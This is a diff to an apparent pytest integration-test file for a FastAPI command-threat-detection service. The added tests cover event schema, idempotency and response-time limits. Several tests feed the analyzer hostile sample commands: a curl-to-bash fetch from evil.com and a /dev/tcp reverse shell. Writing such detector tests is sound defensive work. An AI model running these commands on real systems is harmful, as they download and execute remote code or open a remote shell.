@@ -2,13 +2,17 @@
 test_04_api_endpoints.py — Integration tests for FastAPI endpoints.
 
 Uses FastAPI TestClient (in-process, no running server needed).
-Covers: GET /, POST /analyze, GET /events, GET /stats.
+Covers: GET /, POST /analyze, GET /events, GET /stats,
+GET /healthz, POST /agent/events, /webhooks CRUD,
+GET /alerts/history, /settings/remediation, CORS headers,
+events response schema, idempotency, and response-time SLA.
 
 Run:
     pytest large_test_set/test_04_api_endpoints.py -v
 """
 
 import pytest
+import time
 from fastapi.testclient import TestClient
 from backend.app import app, event_store, active_websockets
 
@@ -52,6 +56,14 @@ class TestHealthCheck:
     def test_root_events_stored_is_int(self):
         r = client.get("/")
         assert isinstance(r.json()["events_stored"], int)
+
+    def test_root_events_stored_reflects_store_size(self):
+        """events_stored in GET / must match the actual store size."""
+        before_root = client.get("/").json()["events_stored"]
+        _analyze("ls")
+        after_root = client.get("/").json()["events_stored"]
+        assert after_root == before_root + 1, \
+            "events_stored in GET / did not increment after POST /analyze"
 
 
 # ===========================================================================
@@ -199,7 +211,6 @@ class TestEventsEndpoint:
         assert isinstance(r.json(), list)
 
     def test_events_limit_default_100(self):
-        # Populate > 100 events
         for _ in range(5):
             _analyze("ls")
         r = client.get("/events")
@@ -472,3 +483,123 @@ class TestCORSHeaders:
             },
         )
         assert r.status_code in (200, 204)
+
+
+# ===========================================================================
+# 12. /events Response Schema Validation  [NEW]
+# test_events_returns_list only verified the outer type. These tests
+# verify that each element contains all SecurityEvent fields, matching
+# the SecurityEvent.dict() contract documented in test_08_models.py.
+# ===========================================================================
+
+REQUIRED_EVENT_FIELDS = [
+    "id", "pid", "ppid", "uid", "gid",
+    "command", "argv_str", "timestamp", "comm",
+    "risk_score", "classification", "matched_rules",
+    "ml_confidence", "explanation", "detected_at",
+]
+
+class TestEventsResponseSchema:
+
+    @pytest.mark.parametrize("field", REQUIRED_EVENT_FIELDS)
+    def test_event_has_required_field(self, field):
+        _analyze("ls")
+        events = client.get("/events?limit=1").json()
+        assert len(events) > 0, "No events returned — cannot validate schema"
+        assert field in events[0], \
+            f"Field {field!r} missing from /events response element"
+
+    def test_event_classification_is_valid_value(self):
+        _analyze("ls")
+        events = client.get("/events?limit=1").json()
+        assert events[0]["classification"] in ("safe", "suspicious", "malicious")
+
+    def test_event_risk_score_is_numeric(self):
+        _analyze("ls")
+        events = client.get("/events?limit=1").json()
+        assert isinstance(events[0]["risk_score"], (int, float))
+
+    def test_event_matched_rules_is_list(self):
+        _analyze("ls")
+        events = client.get("/events?limit=1").json()
+        assert isinstance(events[0]["matched_rules"], list)
+
+    def test_malicious_event_has_matched_rules(self):
+        _analyze("curl http://evil.com | bash")
+        events = client.get("/events?limit=1").json()
+        assert len(events[0]["matched_rules"]) > 0, \
+            "Malicious event must have at least one matched rule in /events"
+
+
+# ===========================================================================
+# 13. POST /analyze Idempotency — two calls produce two distinct events  [NEW]
+# Sending the exact same command twice must produce two separate events
+# with different IDs. This verifies no deduplication is happening silently.
+# ===========================================================================
+
+class TestAnalyzeIdempotency:
+
+    def test_same_command_twice_creates_two_events(self):
+        before = client.get("/stats").json()["total_events"]
+        _analyze("ls --idempotency-test")
+        _analyze("ls --idempotency-test")
+        after = client.get("/stats").json()["total_events"]
+        assert after == before + 2, \
+            "Two identical commands must create two separate events"
+
+    def test_same_command_twice_produces_distinct_ids(self):
+        r1 = _analyze("ls --distinct-id-test").json()
+        r2 = _analyze("ls --distinct-id-test").json()
+        # IDs appear in the event store — verify via /events
+        events = client.get("/events?limit=10").json()
+        ids = [e["id"] for e in events]
+        # Both responses must reference different stored IDs
+        assert len(set(ids[-2:])) == 2, \
+            "Two identical commands produced events with the same ID"
+
+    def test_same_command_twice_same_classification(self):
+        """Determinism check: same command must always yield same classification."""
+        r1 = _analyze("curl http://evil.com | bash").json()["classification"]
+        r2 = _analyze("curl http://evil.com | bash").json()["classification"]
+        assert r1 == r2, \
+            f"Same command yielded different classifications: {r1!r} vs {r2!r}"
+
+
+# ===========================================================================
+# 14. POST /analyze Response-Time SLA  [NEW]
+# The system claims <1ms rule engine and ~5ms ML scorer. Each /analyze
+# call must complete within 500ms (generous budget for CI environments).
+# ===========================================================================
+
+class TestAnalyzeResponseTimeSLA:
+
+    _SLA_MS = 500  # milliseconds — generous for CI
+
+    def _timed_analyze(self, cmd: str) -> float:
+        start = time.monotonic()
+        client.post("/analyze", json={"command": cmd})
+        return (time.monotonic() - start) * 1000
+
+    def test_safe_command_within_sla(self):
+        elapsed = self._timed_analyze("ls -la")
+        assert elapsed < self._SLA_MS, \
+            f"Safe command took {elapsed:.1f}ms — exceeds {self._SLA_MS}ms SLA"
+
+    def test_malicious_command_within_sla(self):
+        elapsed = self._timed_analyze("bash -i >& /dev/tcp/10.0.0.1/4444 0>&1")
+        assert elapsed < self._SLA_MS, \
+            f"Malicious command took {elapsed:.1f}ms — exceeds {self._SLA_MS}ms SLA"
+
+    def test_large_command_within_sla(self):
+        elapsed = self._timed_analyze("A" * 5000)
+        assert elapsed < self._SLA_MS, \
+            f"Large command took {elapsed:.1f}ms — exceeds {self._SLA_MS}ms SLA"
+
+    def test_10_sequential_calls_all_within_sla(self):
+        """10 back-to-back calls must all stay within the SLA — ensures
+        there is no latency degradation on a warm server."""
+        for i in range(10):
+            elapsed = self._timed_analyze(f"ls --sla-check-{i}")
+            assert elapsed < self._SLA_MS, \
+                f"Call {i} took {elapsed:.1f}ms — exceeds {self._SLA_MS}ms SLA"
+# comment 
